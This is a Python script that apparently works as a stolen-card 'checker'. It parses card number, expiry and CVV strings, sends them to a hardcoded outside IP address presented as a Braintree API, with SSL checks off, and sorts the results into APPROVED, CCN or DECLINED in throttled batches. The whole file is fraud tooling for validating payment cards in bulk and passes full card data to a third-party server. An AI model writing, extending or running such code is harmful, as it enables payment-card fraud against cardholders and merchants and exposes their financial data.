import asyncio
import aiohttp
import re
import os

BRAINTREE_API_URL = os.environ.get("BRAINTREE_API_URL", "http://194.150.166.130:5000/")

async def check_braintree(card_number, exp_month, exp_year, cvv):
    """Check card using Braintree API"""
    
    card_clean = card_number.replace(' ', '').replace('-', '')
    
    if len(exp_year) == 2:
        exp_year_full = f"20{exp_year}"
    else:
        exp_year_full = exp_year
    
    cc_param = f"{card_clean}|{exp_month}|{exp_year_full}|{cvv}"
    
    headers = {
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    params = {
        "cc": cc_param
    }
    
    try:
        timeout = aiohttp.ClientTimeout(total=30, connect=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(BRAINTREE_API_URL, headers=headers, params=params, ssl=False) as response:
                response_text = await response.text()
                
                try:
                    result = await response.json()
                    api_message = result.get('message', result.get('msg', result.get('response', response_text)))
                except:
                    api_message = response_text
                
                response_lower = str(api_message).lower()
                
                if "approved" in response_lower or "success" in response_lower or "charged" in response_lower:
                    return {
                        'status': 'APPROVED',
                        'message': api_message,
                        'card': f"{card_clean}|{exp_month}|{exp_year}|{cvv}",
                        'response': api_message
                    }
                elif "ccn" in response_lower or "3d" in response_lower or "authenticate" in response_lower:
                    return {
                        'status': 'CCN',
                        'message': api_message,
                        'card': f"{card_clean}|{exp_month}|{exp_year}|{cvv}",
                        'response': api_message
                    }
                else:
                    return {
                        'status': 'DECLINED',
                        'message': api_message,
                        'card': f"{card_clean}|{exp_month}|{exp_year}|{cvv}",
                        'response': api_message
                    }
                    
    except asyncio.TimeoutError:
        return {
            'status': 'ERROR',
            'message': 'Request timeout',
            'card': f"{card_number}|{exp_month}|{exp_year}|{cvv}",
            'response': 'Timeout'
        }
    except Exception as e:
        return {
            'status': 'ERROR',
            'message': str(e),
            'card': f"{card_number}|{exp_month}|{exp_year}|{cvv}",
            'response': str(e)
        }

async def check_braintree_batch(cards):
    """Check multiple cards in batches with 1s delay between batches"""
    results = []
    batch_size = 5
    
    for i in range(0, len(cards), batch_size):
        batch = cards[i:i + batch_size]
        
        tasks = []
        for card in batch:
            task = check_braintree(
                card['number'],
                card['month'],
                card['year'],
                card['cvv']
            )
            tasks.append(task)
        
        batch_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for j, result in enumerate(batch_results):
            if isinstance(result, Exception):
                results.append({
                    'status': 'ERROR',
                    'message': str(result),
                    'card': f"{batch[j]['number']}|{batch[j]['month']}|{batch[j]['year']}|{batch[j]['cvv']}",
                    'response': str(result)
                })
            else:
                results.append(result)
        
        if i + batch_size < len(cards):
            await asyncio.sleep(1.0)
    
    return results

def parse_card(card_text):
    if not card_text:
        return None
    
    patterns = [
        r'(\d{15,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        r'(\d{15,16})/(\d{1,2})/(\d{2,4})/(\d{3,4})',
        r'(\d{15,16}):(\d{1,2}):(\d{2,4}):(\d{3,4})',
        r'(\d{15,16})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, card_text)
        if match:
            cc, mm, yy, cvv = match.groups()
            if len(yy) == 2:
                yy = '20' + yy
            return {
                'number': cc,
                'month': mm.zfill(2),
                'year': yy,
                'cvv': cvv,
            }
    
    return None
